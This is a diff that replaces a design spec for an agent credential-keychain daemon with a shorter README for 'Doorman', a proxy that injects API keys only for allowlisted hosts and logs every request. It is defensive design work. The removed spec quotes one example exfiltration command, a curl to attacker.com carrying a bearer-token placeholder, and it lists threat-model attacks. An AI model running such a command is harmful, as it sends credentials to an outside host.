@@ -1,189 +1,171 @@
-# Local Agent Keychain — Design Specification
+# Doorman — v1
 
-## 1. Goals and non-goals
+## What it does
 
-**Goals.** Let an agent process on a host make authenticated HTTP requests to approved upstream APIs without ever holding the credentials in its memory, environment, filesystem, or context window. Make credential exfiltration require breaking OS-level isolation, not prompt-level isolation. Provide a clear, narrow interface so the keychain itself stays small and auditable.
+Holds static credentials. Injects them into outgoing HTTP requests bound for allowed hosts. Logs every request. Nothing else.
 
-**Non-goals.** This spec does not attempt to prevent an authorized agent from misusing its legitimate capabilities (sending allowed requests with malicious payloads). That is a capability-scoping and human-approval problem, addressed at a layer above. It also does not replace a secrets-at-rest manager (Vault, 1Password, AWS Secrets Manager); the keychain pulls from one of those at startup or on demand.
+## What it does not do
 
-## 2. Threat model
+No OAuth, no refresh, no signing, no capabilities, no approval flows, no sandbox helpers, no per-agent identity beyond OS uid, no secrets-manager integration, no SDK, no web UI, no hosted mode, no MCP, no plugins. No TLS interception, no CA, no trust-store install ritual.
 
-The trusted components are the host kernel, the keychain daemon's binary and config, and the user/admin operating them. The untrusted components are the agent process, anything the agent spawns, anything the agent can write to disk, and any content the agent ingests (web pages, tool outputs, documents, prior conversation).
+If you find yourself adding any of these, it's a different project. Fork it.
 
-The attacker is assumed to have full control of the agent process — arbitrary code execution as the agent's uid, ability to read the agent's memory, env, filesystem, and to make arbitrary syscalls within whatever sandbox the agent is in. The attacker cannot escalate privileges, escape the sandbox, or compromise the kernel.
+## Architecture
 
-In-scope attacks: reading credentials from agent memory or env; reading the keychain's vault file; `ptrace`-ing the keychain daemon; tricking the daemon into sending a credential to an attacker-controlled host; replaying a captured request; smuggling a credential into a response body the agent can read.
-
-Out of scope: kernel exploits, sandbox escapes, hardware side channels, supply-chain compromise of the keychain binary itself, physical access.
-
-## 3. Architecture overview
-
-Three components on one host:
-
-1. **Keychain daemon (`keychaind`).** Long-running process owned by a dedicated system user (`keychain`). Holds the credential vault in memory, talks to a backing store at startup, and exposes one Unix domain socket.
-2. **Agent sandbox.** The agent runs as a different uid (`agent`), inside a container or `bubblewrap` jail. Its only path to the network for protected destinations is the daemon's socket, bind-mounted in.
-3. **Backing store.** Anything that can hand the daemon plaintext credentials over a mutually authenticated channel: HashiCorp Vault, AWS Secrets Manager, a `0400` file owned by `keychain`, or a hardware token. The daemon authenticates to the backing store using a credential the agent cannot read (e.g., a workload identity, a TPM-sealed token, or just file ownership).
-
-The daemon never returns a credential value to the agent. It only forwards HTTP requests with credentials substituted in transit.
+One binary. One config file. One socket.
 
 ```
-┌─────────────────────────────┐         ┌──────────────────────────────┐
-│   Agent sandbox (uid=agent) │         │  keychaind (uid=keychain)    │
-│                             │         │                              │
-│   agent process             │ socket  │   policy engine              │
-│   ──────────────────────►   │ ──────► │   credential vault (mem)     │
-│   sends HTTP-shaped request │         │   request forwarder ──────►  │  Internet
-│   with {{PLACEHOLDERS}}     │ ◄────── │   (TLS to upstream)          │
-│   reads response body       │ resp    │                              │
-└─────────────────────────────┘         └──────────────────────────────┘
-                                                  │
-                                                  │ pulls at startup
-                                                  ▼
-                                         ┌────────────────────┐
-                                         │  Backing store     │
-                                         │  (Vault / file /   │
-                                         │   TPM / cloud SM)  │
-                                         └────────────────────┘
+agent  ──HTTP_PROXY──▶  doormand  ──TLS──▶  upstream API
+   (plaintext)             │
+                           ├── reads creds.yaml at startup
+                           └── appends to audit.log
 ```
 
-## 4. Process and filesystem isolation
+The agent runs as one uid. `doormand` runs as another. The agent's only network egress is through the proxy. That's the entire security model.
 
-The daemon runs as a dedicated uid that the agent does not share. The vault file, if one exists on disk, is mode `0400`, owned by `keychain:keychain`, and ideally on a tmpfs that the daemon `mlock`s into memory so it does not page to swap.
+Doorman is a plain HTTP forward proxy on the agent side and a TLS client on the upstream side. The agent talks to it in cleartext over loopback (or a netns boundary), so doorman can read and rewrite headers without the gymnastics of a TLS-intercepting MITM. The agent uses `http://api.github.com/...` URLs in code; doorman upgrades to TLS for the upstream connection.
 
-The daemon enables `PR_SET_DUMPABLE=0` (or the platform equivalent) so the agent cannot `ptrace` it or read `/proc/<pid>/mem` even if uids matched. On systemd, the unit sets `ProtectSystem=strict`, `ProtectHome=true`, `PrivateTmp=true`, `NoNewPrivileges=true`, `SystemCallFilter=@system-service`, and drops all capabilities.
+## Config
 
-The agent runs in a sandbox (container, `bubblewrap`, or VM) with no network access except through the daemon's socket and any explicitly allowed unprotected destinations. The socket lives at `/run/keychaind/sock` and is bind-mounted read-write into the sandbox; nothing else from `/run/keychaind/` is visible inside.
+One file, `/etc/doorman/doorman.yaml`, mode `0400`, owned by the doorman uid:
 
-This is the meaningful isolation boundary. Without separate uids and a sandboxed agent, the daemon is just a library and provides no protection.
+```yaml
+- name: github
+  secret: ghp_xxxxxxxxxxxx
+  inject: "Authorization: Bearer {}"
+  hosts: [api.github.com]
 
-## 5. Socket protocol
+- name: slack
+  secret: xoxb-xxxxxxxxxxxx
+  inject: "Authorization: Bearer {}"
+  hosts: [slack.com]
 
-The agent talks to the daemon over a Unix domain socket using a small line-delimited JSON protocol. HTTP-over-Unix-socket would also work and is friendlier to existing libraries; the choice is cosmetic. The socket has mode `0660`, group `agent`, so any process the agent spawns under its own uid can connect, and nothing else on the host can.
+- name: stripe
+  secret: sk_live_xxxxxxxxxxxx
+  inject: "Authorization: Bearer {}"
+  hosts: [api.stripe.com]
+  methods: [GET]
+```
 
-The daemon authenticates the peer via `SO_PEERCRED` (Linux) or equivalent and records the peer pid and uid in every audit entry. There is no shared secret or token; OS-level peer credentials are the auth.
+Five fields. `name` is the placeholder the agent uses (`{{github}}`). `secret` is the string. `inject` is the header template. `hosts` is the allowlist. `methods` is optional and defaults to all.
 
-A request looks like:
+That's the whole config language. No conditionals, no templating beyond `{}`, no includes, no environments. If you need two scopes for the same secret, you write two entries.
+
+## How it works
+
+Agent sets `HTTP_PROXY=http://127.0.0.1:8443`. Agent writes a request like:
+
+```
+GET http://api.github.com/repos/acme/widgets/issues HTTP/1.1
+Host: api.github.com
+X-Cred: {{github}}
+```
+
+(Either absolute-form URI or origin-form with a `Host` header is fine; doorman accepts both. The agent uses the `http://` scheme — the actual HTTPS upgrade happens on the upstream side.)
+
+Doorman:
+
+1. Resolves the upstream host from the URI authority or the `Host` header. No host → 400, log, drop.
+2. Finds the placeholder `{{github}}`. Looks up `github` in the config. Not found → 403, log, drop.
+3. Checks resolved host against the credential's `hosts`. Not allowed → 403, log, drop.
+4. Checks method against `methods`. Not allowed → 403, log, drop.
+5. Drops the placeholder header (its surrounding text is ignored — the inject template is the sole source of the auth header that goes upstream). Drops hop-by-hop headers. Inserts the templated header (`Authorization: Bearer ghp_xxxxxxxxxxxx`).
+6. TLS-connects to the upstream on port 443 and forwards the request, body streamed.
+7. Returns the response, body streamed back. Strips `Set-Cookie` and `WWW-Authenticate` from the response.
+8. Appends one line to the audit log when the response body finishes streaming.
+
+Step 7 is the one piece of "smart" behavior worth keeping, because some upstreams reflect auth material in error responses and the agent shouldn't see it. Everything else passes through untouched.
+
+## Audit log
+
+One line per request, JSON, append-only:
 
 ```json
-{
-  "method": "POST",
-  "url": "https://api.github.com/repos/acme/widgets/issues",
-  "headers": {
-    "Authorization": "Bearer {{github.oauth.access_token}}",
-    "Content-Type": "application/json"
-  },
-  "body": "{\"title\":\"bug\",\"body\":\"...\"}"
-}
+{"ts":"2026-04-27T14:22:01Z","pid":-1,"uid":-1,"cred":"github","host":"api.github.com","method":"GET","path":"/repos/acme/widgets/issues","status":200,"bytes_in":0,"bytes_out":8421,"ms":234,"decision":"allow"}
 ```
 
-A response is the upstream HTTP response, optionally with headers redacted by policy (see §7). The daemon never returns the substituted credential and never echoes the resolved URL back to the agent in a way that includes a credential.
+No bodies. No headers. No secret. The path is logged because operators need to debug; if a path contains a secret (it shouldn't, but APIs are weird), that's an upstream problem, not doorman's.
 
-Placeholders use the form `{{namespace.key}}`. Namespaces correspond to credential bindings in the policy file; keys correspond to fields within a binding (e.g., `access_token`, `refresh_token`, `api_key`). Unknown placeholders cause the request to be rejected, not forwarded with the literal string intact — silent passthrough is a footgun.
+`pid` and `uid` are placeholders for now — TCP listening means there's no `SO_PEERCRED` to read. Multi-uid hosts that can reach the proxy port can't be distinguished in the log. Operationally usually fine; document the gap.
 
-## 6. Credential model
+## Security properties
 
-A credential binding looks like:
+These are the things doorman guarantees, stated plainly:
 
-```yaml
-credentials:
-  github.oauth:
-    type: oauth2
-    backing_store: vault://secret/data/github
-    refresh:
-      endpoint: https://github.com/login/oauth/access_token
-      client_id_ref: vault://secret/data/github#client_id
-      client_secret_ref: vault://secret/data/github#client_secret
-    fields: [access_token, refresh_token]
-  stripe.live:
-    type: api_key
-    backing_store: file:///etc/keychaind/stripe.key
-    fields: [api_key]
+1. The agent's process never holds the secret in memory, env, filesystem, or any response from doorman.
+2. A secret is only ever sent to a host explicitly allowlisted for it.
+3. Every request is logged.
+4. Doorman runs as a different uid from the agent, with `NoNewPrivileges`, dropped capabilities, and `PR_SET_DUMPABLE=0`. The agent cannot ptrace it or read its memory.
+5. The config file is unreadable by the agent uid.
+
+These are the things doorman does *not* guarantee, also stated plainly:
+
+1. That the agent uses its allowed access wisely. An allowed GitHub write can still open spam issues.
+2. That an upstream API doesn't echo your token back in a body. (Headers, yes; bodies, no.)
+3. That a kernel exploit, sandbox escape, or compromise of the doorman binary itself doesn't defeat everything.
+4. That the agent can't enumerate what's allowed by trial and error.
+5. That a third party who can reach doorman's listening port can't issue requests as the agent. Pin the listener to loopback or a netns the agent shares; nothing more clever than that.
+
+## Implementation
+
+Rust. One crate, no plugins, no dynamic loading. Dependencies: `tokio`, `hyper`, `rustls`, `serde`, `serde_yaml`. That's it. No `reqwest` (use `hyper` directly), no async runtime gymnastics, no feature flags.
+
+Target: 800–1200 lines. If it grows past 1500, something has crept in that doesn't belong.
+
+There is no non-trivial piece. No CA, no per-host leaf cert minting, no TLS server side. Just an HTTP/1.1 server, a header rewriter, and a TLS client. Boring is the goal.
+
+## Install and run
+
+```
+brew install doorman
+$EDITOR /etc/doorman/doorman.yaml
+sudo doorman install-service    # writes systemd unit or launchd plist
+sudo systemctl start doorman
 ```
 
-The daemon loads bindings at startup, fetches values, and holds them in `mlock`ed memory. OAuth refresh happens inside the daemon: on a 401 from upstream, the daemon attempts refresh using credentials it pulls fresh from the backing store, retries the request once, and if refresh fails returns a structured error (`{"error":"reauth_required","reauth_url":"..."}`) to the agent. The agent never sees refresh tokens or client secrets even transiently.
+Agent side:
 
-Credentials are never written to logs, never returned in responses, and never substituted into anything other than outgoing requests to allowed destinations.
-
-## 7. Policy engine
-
-Every request passes through a policy check before substitution. The policy file is the most security-critical artifact and should be small, declarative, and reviewed:
-
-```yaml
-policies:
-  - id: github-issues
-    credential: github.oauth
-    allow:
-      - method: [GET, POST, PATCH]
-        host: api.github.com
-        path_prefix: /repos/acme/
-    deny_response_headers: [set-cookie, www-authenticate]
-    rate_limit: 60/min
-    require_approval: false
-
-  - id: stripe-readonly
-    credential: stripe.live
-    allow:
-      - method: GET
-        host: api.stripe.com
-    rate_limit: 30/min
-    require_approval: false
-
-  - id: stripe-writes
-    credential: stripe.live
-    allow:
-      - method: [POST, DELETE]
-        host: api.stripe.com
-    require_approval: true
-    approval_timeout: 120s
+```
+export HTTP_PROXY=http://127.0.0.1:8443
 ```
 
-The four checks that matter:
+Use `http://` URLs in agent code (e.g. `http://api.github.com/...`). Doorman upgrades to TLS for the upstream.
 
-**Destination binding.** A credential is only ever substituted into a request whose host (and optionally path prefix) matches an allow rule for that credential. This is what defends against the `keychain curl https://attacker.com -H "Authorization: Bearer {{token}}"` attack — the daemon refuses to substitute a GitHub token into a request not bound for `api.github.com`.
+Five minutes, one config file, one env var. If it takes longer than that, the install story is wrong and that's the bug to fix before adding anything else.
 
-**Method and path scoping.** Read-only credentials should only ride GET requests; destructive operations require a separate, narrower binding. This limits blast radius if the agent is hijacked.
+## What "extremely well" means
 
-**Response filtering.** Some upstreams reflect auth headers in error bodies or set cookies that contain session material. The daemon strips configured response headers and can optionally regex-scrub response bodies, though body scrubbing is best-effort and should not be relied on.
+Three things, and they're the ones to obsess over:
 
-**Approval gating.** High-risk operations (`require_approval: true`) cause the daemon to block the request and emit an approval prompt to a separate channel — a desktop notification, a CLI prompt on the user's terminal, a webhook to a phone. The agent receives `202 Accepted` with a request id and polls or long-polls for the result. Approvals are one-shot and expire.
+**Correctness of the security boundary.** The `inject` substitution must be impossible to trick. The host allowlist must match the actual upstream after redirects (don't follow redirects across hosts; return the 3xx to the agent and let it decide). The audit log must flush on every line, not buffer. The config reload must not race with in-flight requests. These are unsexy and they are the entire product.
 
-## 8. Audit log
+**Operational quietness.** Doorman should be the boring service in the rack. No surprises on restart. No memory growth. No log spam. No required updates. If someone forgets it's running for six months, that's success.
 
-Every decision is logged: timestamp, peer pid and uid, request method and URL, matched policy id, decision (allow/deny/approval-pending), upstream status code, byte counts, latency. Bodies are not logged by default; headers are logged with `Authorization` and `Cookie` redacted. The log is append-only, owned by `keychain:keychain`, mode `0640`, and shipped to a central collector. The agent cannot read it.
+**Failure modes that fail closed.** Config unparseable → refuse to start. Upstream cert invalid → 502, don't fall back. Allowlist match ambiguous → deny. Audit log unwritable → refuse to serve. Every fork in the road, the safe direction is the default.
 
-This is non-optional. The whole point of the architecture is that the daemon is the chokepoint; if you can't see what flowed through it, you've thrown away half the value.
+## What I'd cut from this if pushed further
 
-## 9. Lifecycle and key rotation
+If "simple" gets pushed harder, the things that go next are:
 
-The daemon supports `SIGHUP` to reload policy without dropping in-flight requests and a `rotate` admin command (over a separate admin socket, mode `0600`, owned by `keychain`) to refetch a credential from the backing store. Rotation invalidates any cached refreshed tokens.
+- The `Set-Cookie` / `WWW-Authenticate` response header stripping. Document the risk and let the operator deal with upstreams that reflect creds.
+- The method-scoping field. Hosts only; if you want method-level control, use two credential entries with different names.
+- The `install-service` subcommand. Document the systemd unit in the README.
 
-The daemon shuts down cleanly on `SIGTERM`, zeroing credential memory before exit (best-effort; this is hard to guarantee in garbage-collected languages, which is why the daemon should be written in Rust, Go, or C with explicit zeroization).
+What does *not* get cut, ever:
 
-On startup, if the backing store is unreachable, the daemon fails closed: it starts but rejects all requests with `503 backing_store_unavailable` rather than serving stale credentials it can't verify are current.
+- The audit log.
+- The host allowlist.
+- The uid separation.
+- The single-binary, single-config-file install.
 
-## 10. Failure modes the spec deliberately accepts
+## Things explicitly already cut
 
-**The agent can use credentials it's authorized to use.** If `github-issues` is allowed, a hijacked agent can open spam issues. Mitigations live above this layer (approval gating for destructive operations, capability scoping, human review of generated content).
+These were in earlier drafts and were dropped:
 
-**The agent can probe what's allowed.** It can enumerate which placeholders work and which destinations succeed. This is recon, not credential leakage, and is acceptable.
+- **Unix socket mode.** HTTP forward-proxy only, on TCP loopback.
+- **HTTPS_PROXY / CONNECT / TLS interception.** Plain HTTP between agent and doorman; the CA, leaf-cert minting, and trust-store install ritual all went with it. Doorman still TLS-connects to the upstream.
+- **OAuth, refresh, approval flows, capabilities, SDKs.** Out of scope from the start.
 
-**Upstream APIs that reflect credentials are partially mitigated.** Header redaction handles the common case; a determined upstream that returns the token in a JSON body will defeat this. The right answer is to not use such APIs with this keychain, or to add a per-policy response-body scrubber.
+## The pitch in one line
 
-**A compromised daemon defeats everything.** This is why the daemon binary should be minimal, statically linked, signed, and ideally written in a memory-safe language. The attack surface is the socket protocol, the policy parser, and the HTTP client. Keep all three boring.
-
-**A compromised host defeats everything.** Out of scope, as stated.
-
-## 11. Minimal viable implementation
-
-For a first version, the smallest thing worth building:
-
-- Single binary in Rust or Go, ~2–3k lines.
-- Unix socket, line-delimited JSON, `SO_PEERCRED` auth.
-- Credentials loaded from a `0400` YAML file at startup; no Vault integration yet.
-- Policy file with host allowlist, method allowlist, and a global rate limit.
-- Audit log to stdout in JSON, redirected by systemd.
-- No OAuth refresh; API keys only.
-- No approval gating; allow or deny.
-
-That gets you the core property — credentials never enter the agent's address space — and is small enough to audit in an afternoon. OAuth, approval flows, and Vault integration are additions, not foundations. Build the foundation first and resist the temptation to make it clever.
-
+Doorman is an HTTP proxy that holds your API keys and refuses to send them anywhere they don't belong. That's the whole product.
